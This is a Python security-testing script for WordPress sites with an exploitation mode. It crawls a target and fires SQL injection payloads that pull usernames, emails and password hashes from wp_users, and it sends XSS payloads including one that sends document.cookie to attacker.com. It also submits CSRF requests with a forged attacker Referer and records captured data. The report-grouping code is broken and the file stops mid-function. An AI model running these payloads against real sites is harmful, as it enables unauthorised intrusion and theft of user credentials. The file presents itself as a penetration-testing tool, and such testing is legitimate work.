
#!/usr/bin/env python3
"""
Website Security Testing Tool (Enhanced with Exploitation Mode for WordPress)

Tests for various vulnerabilities and attempts controlled exploitation for critical issues.
For educational purposes only - use only on websites you own or have permission to test.
"""

import sys
import argparse
import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import random
import string
import json
import re
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor
import time
import os
import uuid
import html

# Initialize colorama
init()

class WebSecurityTester:
    def __init__(self, target_url, verbose=False, threads=5, timeout=10, output_dir="security_tests", safe_mode=False, exploit=False):
        """
        Initialize the security tester.
        
        Args:
            target_url: The base URL of the website to test
            verbose: Whether to show detailed output
            threads: Number of threads for concurrent testing
            timeout: Request timeout in seconds
            output_dir: Directory to save test results
            safe_mode: Avoid generating exploitable PoCs
            exploit: Attempt to exploit critical vulnerabilities
        """
        self.target_url = target_url.rstrip('/')
        self.verbose = verbose
        self.threads = threads
        self.timeout = timeout
        self.output_dir = output_dir
        self.safe_mode = safe_mode
        self.exploit = exploit
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        })
        self.forms = []
        self.links = []
        self.vulnerabilities = []
        self.exploits_successful = 0
        
        # Create output directory
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
            
        # Verify the target URL
        try:
            parsed_url = urlparse(target_url)
            if not parsed_url.scheme or not parsed_url.netloc:
                raise ValueError("Invalid URL format")
        except Exception as e:
            print(f"{Fore.RED}Error: Invalid target URL: {e}{Style.RESET_ALL}")
            sys.exit(1)
            
        print(f"{Fore.CYAN}Target URL: {target_url}{Style.RESET_ALL}")
        
    def log(self, message, level="info"):
        """Log messages with color coding."""
        if level == "info":
            print(f"{Fore.BLUE}[INFO] {message}{Style.RESET_ALL}")
        elif level == "success":
            print(f"{Fore.GREEN}[SUCCESS] {message}{Style.RESET_ALL}")
        elif level == "warning":
            print(f"{Fore.YELLOW}[WARNING] {message}{Style.RESET_ALL}")
        elif level == "error":
            print(f"{Fore.RED}[ERROR] {message}{Style.RESET_ALL}")
        elif level == "vuln":
            print(f"{Fore.RED}[VULNERABILITY] {message}{Style.RESET_ALL}")
        elif level == "exploit":
            print(f"{Fore.MAGENTA}[EXPLOIT] {message}{Style.RESET_ALL}")
            
    def verbose_log(self, message, level="info"):
        """Log messages only if verbose mode is enabled."""
        if self.verbose:
            self.log(message, level)
            
    def add_vulnerability(self, vuln_type, url, details, severity="Medium", exploit_result=None):
        """Add a vulnerability to the list of findings."""
        vuln = {
            "type": vuln_type,
            "url": url,
            "details": details,
            "severity": severity
        }
        if exploit_result:
            vuln.update({
                "exploit_attempted": True,
                "exploit_success": exploit_result.get("success", False),
                "exploit_details": exploit_result.get("details", ""),
                "exploit_captured_data": exploit_result.get("captured_data", ""),
                "exploit_response_code": exploit_result.get("response_code"),
                "exploit_response_snippet": exploit_result.get("response_snippet", "")
            })
        self.vulnerabilities.append(vuln)
        self.log(f"Found {severity} severity {vuln_type} vulnerability at {url}", "vuln")
        if self.verbose:
            self.log(f"Details: {details}", "vuln")
            if exploit_result and exploit_result.get("success"):
                self.log(f"Exploit succeeded: {exploit_result['details']}", "exploit")
                
    def detect_wordpress(self):
        """Detect if the site is running WordPress."""
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            if 'wp-content' in response.text or 'wp-includes' in response.text:
                self.log("Detected WordPress site", "success")
                return True
            return False
        except requests.RequestException:
            return False

    def crawl_website(self, max_pages=20):
        """Crawl the website to discover pages, forms, and links."""
        self.log(f"Starting website crawl (max {max_pages} pages)...")
        
        visited_urls = set()
        urls_to_visit = [self.target_url]
        wordpress_endpoints = [
            '/wp-login.php', '/?s=', '/my-account/', '/cart/', '/checkout/',
            '/contact/', '/register/', '/?p=1', '/?post_type=product'
        ]
        
        # Add WordPress-specific endpoints
        if self.detect_wordpress():
            for endpoint in wordpress_endpoints:
                full_url = urljoin(self.target_url, endpoint)
                if full_url not in urls_to_visit:
                    urls_to_visit.append(full_url)
        
        while urls_to_visit and len(visited_urls) < max_pages:
            url = urls_to_visit.pop(0)
            
            if url in visited_urls or not url.startswith(self.target_url):
                continue
                
            try:
                self.verbose_log(f"Crawling: {url}")
                response = self.session.get(url, timeout=self.timeout)
                visited_urls.add(url)
                
                if 'text/html' not in response.headers.get('Content-Type', ''):
                    continue
                    
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find forms
                for form in soup.find_all('form'):
                    form_data = {
                        'url': url,
                        'action': urljoin(url, form.get('action', '')),
                        'method': form.get('method', 'get').lower(),
                        'inputs': []
                    }
                    
                    for input_field in form.find_all(['input', 'textarea', 'select']):
                        input_type = input_field.get('type', '')
                        input_name = input_field.get('name', '')
                        
                        if input_name and input_type != 'submit' and input_type != 'button':
                            form_data['inputs'].append({
                                'name': input_name,
                                'type': input_type
                            })
                            
                    if form_data['inputs']:
                        self.forms.append(form_data)
                        
                # Find links with query parameters
                for link in soup.find_all('a', href=True):
                    href = link.get('href')
                    full_url = urljoin(url, href)
                    
                    if full_url.startswith(self.target_url):
                        parsed_url = urlparse(full_url)
                        if parsed_url.query:
                            self.links.append(full_url)
                            
                        if full_url not in visited_urls:
                            urls_to_visit.append(full_url)
                            
            except requests.RequestException as e:
                self.log(f"Error crawling {url}: {e}", "error")
                
        self.log(f"Crawl completed. Found {len(visited_urls)} pages, {len(self.forms)} forms, and {len(self.links)} links with parameters.")
        
    def generate_sql_payloads(self):
        """Generate WordPress-specific SQL injection payloads."""
        test_id = str(uuid.uuid4())[:8]
        return [
            f"' OR '1'='1' -- TEST-{test_id}",
            f"' OR 1=1 -- TEST-{test_id}",
            f"admin' -- TEST-{test_id}",
            f"' UNION SELECT 1,2,3,4,5 -- TEST-{test_id}",
            f"' UNION SELECT user_login,user_email,user_pass FROM wp_users -- TEST-{test_id}",
            f"' UNION SELECT option_name,option_value FROM wp_options -- TEST-{test_id}",
            f"'; WAITFOR DELAY '0:0:1' -- TEST-{test_id}",
            f"' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user_login FROM wp_users LIMIT 1), 0x7e)) -- TEST-{test_id}"
        ]

    def attempt_sql_exploit(self, vuln, form=None, url=None):
        """Attempt to exploit a SQL injection vulnerability."""
        exploit_result = {'success': False, 'details': '', 'captured_data': '', 'response_code': None}
        payload = vuln['payload']
        severity = vuln['severity']
        
        if severity != 'Critical':
            exploit_result['details'] = 'Exploitation skipped: Only critical vulnerabilities are exploited.'
            return exploit_result

        self.log(f"Attempting SQL injection exploit for {vuln.get('url', url)} with payload: {payload}", "exploit")
        
        try:
            if form:
                test_data = {}
                for input_field in form['inputs']:
                    if input_field['name'] == vuln['field']:
                        test_data[input_field['name']] = payload
                    else:
                        test_data[input_field['name']] = f"test-{uuid.uuid4()}" if input_field['type'] != 'password' else ''.join(random.choices(string.ascii_letters + string.digits, k=10))
                
                if form['method'] == 'post':
                    response = self.session.post(form['action'], data=test_data, timeout=self.timeout)
                else:
                    response = self.session.get(form['action'], params=test_data, timeout=self.timeout)
            else:
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query)
                params[vuln['parameter']] = [payload]
                query = urlencode(params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query}"
                response = self.session.get(test_url, timeout=self.timeout)

            # Check for data extraction
            patterns = [
                r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',  # Email
                r'([a-zA-Z0-9_-]{3,20})',  # Username
                r'(\$P\$[a-zA-Z0-9./]{30,})',  # WordPress password hash
                r'(wp_[a-z_]+)'  # Table names
            ]
            
            extracted_data = []
            for pattern in patterns:
                matches = re.findall(pattern, response.text)
                if matches:
                    extracted_data.extend(matches)
            
            if extracted_data:
                self.log(f"Exploit succeeded! Extracted data: {', '.join(set(extracted_data))}", "exploit")
                exploit_result['success'] = True
                exploit_result['details'] = f"Extracted data with payload: {payload}"
                exploit_result['captured_data'] = ', '.join(set(extracted_data))
                self.exploits_successful += 1
            else:
                exploit_result['details'] = "Exploit attempted but no clear data extracted."
            
            exploit_result['response_code'] = response.status_code
            exploit_result['response_snippet'] = response.text[:500]

        except requests.RequestException as e:
            exploit_result['details'] = f"Exploit failed due to request error: {e}"
            self.log(f"Exploit failed: {e}", "error")
        
        return exploit_result

    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities."""
        self.log("Testing for SQL injection vulnerabilities...")
        
        payloads = self.generate_sql_payloads()
        
        # Test forms
        for form in self.forms:
            self.verbose_log(f"Testing form at {form['url']} for SQL injection")
            
            # Baseline response
            baseline_data = {}
            for input_field in form['inputs']:
                baseline_data[input_field['name']] = f"test-{random.randint(1, 1000)}"
            try:
                if form['method'] == 'post':
                    baseline_response = self.session.post(form['action'], data=baseline_data, timeout=self.timeout)
                else:
                    baseline_response = self.session.get(form['action'], params=baseline_data, timeout=self.timeout)
                baseline_content = baseline_response.text
                baseline_time = baseline_response.elapsed.total_seconds()
            except requests.RequestException as e:
                self.verbose_log(f"Error getting baseline response: {e}", "error")
                continue
            
            for payload in payloads:
                for input_field in form['inputs']:
                    data = baseline_data.copy()
                    data[input_field['name']] = payload
                    
                    try:
                        start_time = time.time()
                        if form['method'] == 'post':
                            response = self.session.post(form['action'], data=data, timeout=self.timeout)
                        else:
                            response = self.session.get(form['action'], params=data, timeout=self.timeout)
                        response_time = time.time() - start_time
                        
                        sql_errors = [
                            "SQL syntax", "mysql_fetch_array", "ORA-", "Oracle error",
                            "Microsoft SQL Server", "PostgreSQL", "SQLite3", "syntax error",
                            "unclosed quotation mark"
                        ]
                        
                        vuln = {
                            'url': form['url'],
                            'action': form['action'],
                            'method': form['method'],
                            'field': input_field['name'],
                            'payload': payload,
                            'severity': 'High'
                        }
                        
                        for error in sql_errors:
                            if error.lower() in response.text.lower() and error.lower() not in baseline_content.lower():
                                self.log(f"Error-based SQL injection found in field {input_field['name']} with payload: {payload}", "vuln")
                                vuln['severity'] = 'Critical'
                                vuln['type'] = 'error-based'
                                vuln['evidence'] = f"SQL error detected: {error}"
                                exploit_result = self.attempt_sql_exploit(vuln, form=form) if self.exploit else None
                                self.add_vulnerability("SQL Injection", form['url'], f"SQL error with payload: {payload}", "Critical", exploit_result)
                                break
                        
                        if response_time > baseline_time + 1 and ("WAITFOR" in payload.upper() or "SLEEP" in payload.upper()):
                            vuln['severity'] = 'High'
                            vuln['type'] = 'time-based'
                            vuln['evidence'] = f"Response time increased from {baseline_time:.2f}s to {response_time:.2f}s"
                            self.add_vulnerability("SQL Injection", form['url'], f"Time-based SQLi with payload: {payload}", "High")
                            
                    except requests.RequestException as e:
                        self.verbose_log(f"Error testing form with payload {payload}: {e}", "error")
                        time.sleep(0.5)  # Rate limiting
                        
        # Test URL parameters
        for link in self.links:
            parsed_url = urlparse(link)
            params = parse_qs(parsed_url.query)
            
            if not params:
                continue
                
            self.verbose_log(f"Testing URL parameters in {link} for SQL injection")
            
            try:
                baseline_response = self.session.get(link, timeout=self.timeout)
                baseline_content = baseline_response.text
                baseline_time = baseline_response.elapsed.total_seconds()
            except requests.RequestException as e:
                self.verbose_log(f"Error getting baseline response: {e}", "error")
                continue
                
            for param_name in params:
                for payload in payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    query = urlencode(test_params, doseq=True)
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query}"
                    
                    try:
                        start_time = time.time()
                        response = self.session.get(test_url, timeout=self.timeout)
                        response_time = time.time() - start_time
                        
                        sql_errors = [
                            "SQL syntax", "mysql_fetch_array", "ORA-", "Oracle error",
                            "Microsoft SQL Server", "PostgreSQL", "SQLite3", "syntax error",
                            "unclosed quotation mark"
                        ]
                        
                        vuln = {
                            'url': test_url,
                            'parameter': param_name,
                            'payload': payload,
                            'severity': 'High'
                        }
                        
                        for error in sql_errors:
                            if error.lower() in response.text.lower() and error.lower() not in baseline_content.lower():
                                self.log(f"Error-based SQL injection found in parameter {param_name} with payload: {payload}", "vuln")
                                vuln['severity'] = 'Critical'
                                vuln['type'] = 'error-based'
                                vuln['evidence'] = f"SQL error detected: {error}"
                                exploit_result = self.attempt_sql_exploit(vuln, url=test_url) if self.exploit else None
                                self.add_vulnerability("SQL Injection", test_url, f"SQL error in parameter {param_name} with payload: {payload}", "Critical", exploit_result)
                                break
                            
                        if response_time > baseline_time + 1 and ("WAITFOR" in payload.upper() or "SLEEP" in payload.upper()):
                            vuln['severity'] = 'High'
                            vuln['type'] = 'time-based'
                            vuln['evidence'] = f"Response time increased from {baseline_time:.2f}s to {response_time:.2f}s"
                            self.add_vulnerability("SQL Injection", test_url, f"Time-based SQLi in parameter {param_name} with payload: {payload}", "High")
                            
                    except requests.RequestException as e:
                        self.verbose_log(f"Error testing URL {test_url}: {e}", "error")
                        time.sleep(0.5)  # Rate limiting
                        
        self.log("SQL injection testing completed.")
        
    def generate_xss_payloads(self):
        """Generate WordPress-specific XSS payloads."""
        test_id = str(uuid.uuid4())[:8]
        return [
            f"<script>alert('XSS-{test_id}')</script>",
            f"<img src=x onerror=alert('XSS-{test_id}')>",
            f"<svg onload=alert('XSS-{test_id}')>",
            f"\"><script>alert('XSS-{test_id}')</script>",
            f"<script>fetch('https://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)+'&id={test_id}')</script>",
            f"<script>document.forms[0].s.value='XSS-{test_id}';document.forms[0].submit()</script>",
            f"<img src=x onerror=\"document.getElementById('billing_first_name').value='XSS-{test_id}';document.forms[0].submit()\">"
        ]

    def attempt_xss_exploit(self, vuln, form=None, url=None):
        """Attempt to exploit an XSS vulnerability."""
        exploit_result = {'success': False, 'details': '', 'captured_data': '', 'response_code': None}
        payload = vuln['payload']
        severity = vuln['severity']
        
        if severity != 'Critical':
            exploit_result['details'] = 'Exploitation skipped: Only critical vulnerabilities are exploited.'
            return exploit_result

        self.log(f"Attempting XSS exploit for {vuln.get('url', url)} with payload: {payload}", "exploit")
        
        try:
            if form:
                test_data = {}
                for input_field in form['inputs']:
                    if input_field['name'] == vuln['field']:
                        test_data[input_field['name']] = payload
                    else:
                        test_data[input_field['name']] = f"test-{uuid.uuid4()}" if input_field['type'] != 'password' else ''.join(random.choices(string.ascii_letters + string.digits, k=10))
                
                if form['method'] == 'post':
                    response = self.session.post(form['action'], data=test_data, timeout=self.timeout)
                else:
                    response = self.session.get(form['action'], params=test_data, timeout=self.timeout)
            else:
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query)
                params[vuln['parameter']] = [payload]
                query = urlencode(params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query}"
                response = self.session.get(test_url, timeout=self.timeout)

            test_id = re.search(r'XSS-([a-f0-9]{8})', payload)
            if test_id:
                test_id = test_id.group(1)
                if f'XSS-{test_id}' in response.text or test_id in response.text:
                    self.log(f"Exploit succeeded! Payload executed: {payload}", "exploit")
                    exploit_result['success'] = True
                    exploit_result['details'] = f"Payload executed with test ID: {test_id}"
                    
                    if 'cookie' in payload.lower():
                        cookies = self.session.cookies.get_dict()
                        if cookies:
                            exploit_result['captured_data'] = f"Cookies: {json.dumps(cookies)}"
                            self.log(f"Captured cookies: {cookies}", "exploit")
                    
                    self.exploits_successful += 1
                else:
                    exploit_result['details'] = "Payload reflected but not executed (possible sanitization)."
            
            exploit_result['response_code'] = response.status_code
            exploit_result['response_snippet'] = response.text[:500]

        except requests.RequestException as e:
            exploit_result['details'] = f"Exploit failed due to request error: {e}"
            self.log(f"Exploit failed: {e}", "error")
        
        return exploit_result

    def test_xss(self):
        """Test for Cross-Site Scripting (XSS) vulnerabilities."""
        self.log("Testing for Cross-Site Scripting (XSS) vulnerabilities...")
        
        payloads = self.generate_xss_payloads()
        
        # Test forms
        for form in self.forms:
            self.verbose_log(f"Testing form at {form['url']} for XSS")
            
            for payload in payloads:
                test_id = re.search(r'XSS-([a-f0-9]{8})', payload)
                test_id = test_id.group(1) if test_id else str(uuid.uuid4())[:8]
                
                for input_field in form['inputs']:
                    data = {}
                    for field in form['inputs']:
                        if field['name'] == input_field['name']:
                            data[field['name']] = payload
                        else:
                            data[field['name']] = f"test-{test_id}"
                    
                    try:
                        if form['method'] == 'post':
                            response = self.session.post(form['action'], data=data, timeout=self.timeout)
                        else:
                            response = self.session.get(form['action'], params=data, timeout=self.timeout)
                        
                        if payload in response.text or test_id in response.text:
                            escaped_payload = html.escape(payload)
                            severity = 'High'
                            vuln_type = 'Reflected XSS'
                            
                            if escaped_payload != payload and escaped_payload in response.text:
                                self.verbose_log(f"Payload reflected but escaped: {payload}")
                                severity = 'Medium'
                                vuln_type = 'Escaped Reflection'
                            else:
                                self.log(f"XSS vulnerability in field {input_field['name']} with payload: {payload}", "vuln")
                                if 'cookie' in payload.lower():
                                    severity = 'Critical'
                                    vuln_type = 'Exploitable XSS'
                                
                                vuln = {
                                    'url': form['url'],
                                    'action': form['action'],
                                    'method': form['method'],
                                    'field': input_field['name'],
                                    'payload': payload,
                                    'severity': severity,
                                    'type': vuln_type
                                }
                                
                                exploit_result = self.attempt_xss_exploit(vuln, form=form) if self.exploit and severity == 'Critical' else None
                                self.add_vulnerability("Cross-Site Scripting (XSS)", form['url'], f"XSS payload reflected: {payload}", severity, exploit_result)
                            
                    except requests.RequestException as e:
                        self.verbose_log(f"Error testing form with payload {payload}: {e}", "error")
                        time.sleep(0.5)  # Rate limiting
                        
        # Test URL parameters
        for link in self.links:
            parsed_url = urlparse(link)
            params = parse_qs(parsed_url.query)
            
            if not params:
                continue
                
            self.verbose_log(f"Testing URL parameters in {link} for XSS")
            
            for param_name in params:
                for payload in payloads:
                    test_id = re.search(r'XSS-([a-f0-9]{8})', payload)
                    test_id = test_id.group(1) if test_id else str(uuid.uuid4())[:8]
                    
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    query = urlencode(test_params, doseq=True)
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query}"
                    
                    try:
                        response = self.session.get(test_url, timeout=self.timeout)
                        
                        if payload in response.text or test_id in response.text:
                            escaped_payload = html.escape(payload)
                            severity = 'High'
                            vuln_type = 'Reflected XSS'
                            
                            if escaped_payload != payload and escaped_payload in response.text:
                                self.verbose_log(f"Payload reflected but escaped: {payload}")
                                severity = 'Medium'
                                vuln_type = 'Escaped Reflection'
                            else:
                                self.log(f"XSS vulnerability in parameter {param_name} with payload: {payload}", "vuln")
                                if 'cookie' in payload.lower():
                                    severity = 'Critical'
                                    vuln_type = 'Exploitable XSS'
                                
                                vuln = {
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'severity': severity,
                                    'type': vuln_type
                                }
                                
                                exploit_result = self.attempt_xss_exploit(vuln, url=test_url) if self.exploit and severity == 'Critical' else None
                                self.add_vulnerability("Cross-Site Scripting (XSS)", test_url, f"XSS payload in parameter {param_name}: {payload}", severity, exploit_result)
                            
                    except requests.RequestException as e:
                        self.verbose_log(f"Error testing URL {test_url}: {e}", "error")
                        time.sleep(0.5)  # Rate limiting
                        
        self.log("XSS testing completed.")
        
    def attempt_csrf_exploit(self, form):
        """Attempt to exploit a CSRF vulnerability."""
        exploit_result = {'success': False, 'details': '', 'captured_data': '', 'response_code': None}
        
        self.log(f"Attempting CSRF exploit for form at {form['url']}", "exploit")
        
        try:
            data = {}
            for input_field in form['inputs']:
                if input_field['type'] == 'email':
                    data[input_field['name']] = f"test-{uuid.uuid4()}@example.com"
                elif input_field['type'] == 'password':
                    data[input_field['name']] = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
                else:
                    data[input_field['name']] = f"test-{uuid.uuid4()}"
            
            headers = self.session.headers.copy()
            headers['Referer'] = 'https://attacker.com'
            
            response = self.session.post(form['action'], data=data, headers=headers, timeout=self.timeout)
            
            if response.status_code in [200, 302]:
                self.log(f"CSRF exploit succeeded! Form submitted without valid referer", "exploit")
                exploit_result['success'] = True
                exploit_result['details'] = f"Form submitted successfully with data: {json.dumps(data)}"
                exploit_result['captured_data'] = f"Submitted data: {json.dumps(data)}"
                self.exploits_successful += 1
            else:
                exploit_result['details'] = f"Form submission failed with status {response.status_code}"
            
            exploit_result['response_code'] = response.status_code
            exploit_result['response_snippet'] = response.text[:500]
            
        except requests.RequestException as e:
            exploit_result['details'] = f"Exploit failed due to request error: {e}"
            self.log(f"Exploit failed: {e}", "error")
        
        return exploit_result

    def test_csrf(self):
        """Test for Cross-Site Request Forgery (CSRF) vulnerabilities."""
        self.log("Testing for CSRF vulnerabilities...")
        
        for form in self.forms:
            if form['method'] == 'post':
                self.verbose_log(f"Testing form at {form['url']} for CSRF protection")
                
                has_csrf_token = False
                for input_field in form['inputs']:
                    name = input_field['name'].lower()
                    if 'csrf' in name or 'token' in name or '_token' in name or 'nonce' in name:
                        has_csrf_token = True
                        break
                        
                if not has_csrf_token:
                    exploit_result = self.attempt_csrf_exploit(form) if self.exploit else None
                    self.add_vulnerability(
                        "Cross-Site Request Forgery (CSRF)",
                        form['url'],
                        "Form lacks CSRF protection (no token/nonce detected)",
                        "High",
                        exploit_result
                    )
                    
        self.log("CSRF testing completed.")
        
    def test_cookie_security(self):
        """Test for cookie security issues."""
        self.log("Testing for cookie security issues...")
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            
            if not self.session.cookies:
                self.log("No cookies found to test.", "warning")
                return
                
            self.verbose_log(f"Found {len(self.session.cookies)} cookies to test")
            
            for cookie in self.session.cookies:
                issues = []
                
                if not cookie.secure and urlparse(self.target_url).scheme == 'https':
                    issues.append("Missing Secure flag")
                    
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    issues.append("Missing HttpOnly flag")
                    
                if not cookie.has_nonstandard_attr('SameSite'):
                    issues.append("Missing SameSite attribute")
                    
                if issues:
                    self.add_vulnerability(
                        "Cookie Security Issues",
                        self.target_url,
                        f"Cookie '{cookie.name}' has issues: {', '.join(issues)}",
                        "Medium"
                    )
                    
        except requests.RequestException as e:
            self.log(f"Error testing cookies: {e}", "error")
            
        self.log("Cookie security testing completed.")
        
    def test_content_security_policy(self):
        """Test for Content Security Policy (CSP) issues."""
        self.log("Testing for Content Security Policy issues...")
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            
            csp_header = response.headers.get('Content-Security-Policy')
            if not csp_header:
                self.add_vulnerability(
                    "Missing Content Security Policy",
                    self.target_url,
                    "Content-Security-Policy header is not set",
                    "Medium"
                )
            else:
                self.verbose_log(f"CSP header found: {csp_header}")
                
                unsafe_directives = []
                if "unsafe-inline" in csp_header:
                    unsafe_directives.append("unsafe-inline")
                if "unsafe-eval" in csp_header:
                    unsafe_directives.append("unsafe-eval")
                if "*" in csp_header:
                    unsafe_directives.append("wildcard (*) source")
                    
                if unsafe_directives:
                    self.add_vulnerability(
                        "Weak Content Security Policy",
                        self.target_url,
                        f"CSP contains unsafe directives: {', '.join(unsafe_directives)}",
                        "Medium"
                    )
                    
        except requests.RequestException as e:
            self.log(f"Error testing CSP: {e}", "error")
            
        self.log("Content Security Policy testing completed.")
        
    def test_information_disclosure(self):
        """Test for information disclosure issues."""
        self.log("Testing for information disclosure...")
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            
            server_header = response.headers.get('Server')
            if server_header and len(server_header) > 0:
                self.add_vulnerability(
                    "Server Information Disclosure",
                    self.target_url,
                    f"Server header reveals: {server_header}",
                    "Low"
                )
                
            powered_by = response.headers.get('X-Powered-By')
            if powered_by and len(powered_by) > 0:
                self.add_vulnerability(
                    "Technology Information Disclosure",
                    self.target_url,
                    f"X-Powered-By header reveals: {powered_by}",
                    "Low"
                )
                
            sensitive_headers = ['X-AspNet-Version', 'X-AspNetMvc-Version', 'X-Generator']
            for header in sensitive_headers:
                value = response.headers.get(header)
                if value and len(value) > 0:
                    self.add_vulnerability(
                        "Technology Information Disclosure",
                        self.target_url,
                        f"{header} header reveals: {value}",
                        "Low"
                    )
                    
            pii_patterns = [
                r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
                r'\b\d{4}-\d{4}-\d{4}-\d{4}\b',  # Credit card
                r'\b\d{16}\b',  # Credit card without dashes
                r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email
                r'\b\d{3}-\d{3}-\d{4}\b'  # Phone number
            ]
            
            for pattern in pii_patterns:
                matches = re.findall(pattern, response.text)
                if matches:
                    self.add_vulnerability(
                        "PII Disclosure",
                        self.target_url,
                        f"Potential PII found: {matches[:3]}...",
                        "High"
                    )
                    
        except requests.RequestException as e:
            self.log(f"Error testing for information disclosure: {e}", "error")
            
        self.log("Information disclosure testing completed.")
        
    def test_security_headers(self):
        """Test for missing security headers."""
        self.log("Testing for missing security headers...")
        
        security_headers = {
            'Strict-Transport-Security': 'Missing HSTS header (recommended for HTTPS)',
            'X-Content-Type-Options': 'Missing X-Content-Type-Options header (set to "nosniff")',
            'X-Frame-Options': 'Missing X-Frame-Options header (set to "DENY" or "SAMEORIGIN")',
            'Referrer-Policy': 'Missing Referrer-Policy header (set to "strict-origin-when-cross-origin")',
            'Permissions-Policy': 'Missing Permissions-Policy header (restrict features like geolocation)'
        }
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            
            for header, message in security_headers.items():
                if header not in response.headers:
                    self.add_vulnerability(
                        "Missing Security Header",
                        self.target_url,
                        message,
                        "Low"
                    )
                    
        except requests.RequestException as e:
            self.log(f"Error testing security headers: {e}", "error")
            
        self.log("Security headers testing completed.")
        
    def run_all_tests(self):
        """Run all security tests."""
        self.log("Starting security tests...")
        
        self.crawl_website()
        
        tests = [
            self.test_sql_injection,
            self.test_xss,
            self.test_csrf,
            self.test_cookie_security,
            self.test_content_security_policy,
            self.test_information_disclosure,
            self.test_security_headers
        ]
        
        for test in tests:
            test()
            
        self.log("All security tests completed.")
        
    def generate_report(self, output_file=None):
        """Generate a report of the findings."""
        self.log("Generating report...")
        
        severity_counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0}
        for vuln in self.vulnerabilities:
            severity_counts[vuln["severity"]] += 1
            
        report = {
            "target": self.target_url,
            "scan_time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "summary": {
                "total_vulnerabilities": len(self.vulnerabilities),
                "critical_severity": severity_counts["Critical"],
                "high_severity": severity_counts["High"],
                "medium_severity": severity_counts["Medium"],
                "low_severity": severity_counts["Low"],
                "successful_exploits": self.exploits_successful
            },
            "vulnerabilities": self.vulnerabilities
        }
        
        # Print summary to console
        print("\n" + "="*80)
        print(f"{Fore.CYAN}SECURITY TEST RESULTS FOR: {self.target_url}{Style.RESET_ALL}")
        print("="*80)
        print(f"Total Vulnerabilities Found: {len(self.vulnerabilities)}")
        print(f"{Fore.RED}Critical Severity: {severity_counts['Critical']}{Style.RESET_ALL}")
        print(f"{Fore.RED}High Severity: {severity_counts['High']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Medium Severity: {severity_counts['Medium']}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Low Severity: {severity_counts['Low']}{Style.RESET_ALL}")
        if self.exploit:
            print(f"{Fore.MAGENTA}Successful Exploits: {self.exploits_successful}{Style.RESET_ALL}")
        print("="*80 + "\n")
        
        # Print vulnerabilities grouped by type
        vuln_types = {}
        for vuln in vuln_types.items():
            vuln_type = vuln["type"]
            if vuln_type not in vuln_types:
                vuln_types[vuln_type] = []
            vuln_types[vuln_type].append(vuln)
            
        for vuln_type, vulns in vuln_types.items():
            print(f"{Fore.CYAN}== {vuln_type} ({len(vulns)}) =={Style.RESET_ALL}")
            for vuln in vulns:
                severity_color = Fore.RED if vuln["severity"] in ["Critical", "High"] else Fore.YELLOW if vuln["severity"] == "Medium" else Fore.GREEN
                print(f"{severity_color}[{vuln['severity']}]{Style.RESET_ALL} {vuln['url']}")
                print(f"  {vuln['details']}")
                if vuln.get("exploit_success"):
                    print(f"  {Fore.MAGENTA}Exploit Succeeded: {vuln['exploit_details']}{Style.RESET_ALL}")
                    if vuln['exploit_captured_data']:
                        print(f"  {Fore.MAGENTA}Captured Data: {vuln['exploit_captured_data']}{Style.RESET_ALL}")
            print()
        
        # Save report to file
        if output_file:
            try:
                with open(output_file, 'w') as f:
                    if output_file.endswith('.json'):
                        json.dump(report, f, indent=2)
                    else:
                        f.write(f"# Security Test Results for {self.target_url}\n\n")
                        f.write(f"Scan Time: {report['scan_time']}\n\n")
                        f.write("## Summary\n\n")
                        f.write(f"- Total Vulnerabilities: {report['summary']['total_vulnerabilities']}\n")
                        f.write(f"- Critical Severity: {report['summary']['critical_severity']}\n")
                        f.write(f"- High Severity: {report['summary']['high_severity']}\n")
                        f.write(f"- Medium Severity: {report['summary']['medium_severity']}\n")
                        f.write(f"- Low Severity: {report['summary']['low_severity']}\n")
                        if self.exploit:
                            f.write(f"- Successful Exploits: {report['summary']['successful_exploits']}\n")
                        f.write("\n")
                        
                        f.write("## Vulnerabilities\n\n")
                        for vuln_type, vulns in vuln_types.items():
                            f.write(f"### {vuln_type} ({len(vulns)})\n\n")
                            for vuln in vulns:
                                f.write(f"**{vuln['severity']} Severity**: {vuln['url']}\n")
                                f.write(f"- Details: {vuln['details']}\n")
                                if vuln.get("exploit_attempted"):
                                    f.write(f"- Exploit Success: {'Yes' if vuln['exploit_success'] else 'No'}\n")
                                    f.write(f"- Exploit Details: {vuln['exploit_details']}\n")
                                    if vuln['exploit_success']:
                                        f.write(f"- Captured Data: {vuln['exploit_captured_data']}\n")
                                f.write("\n")
                        
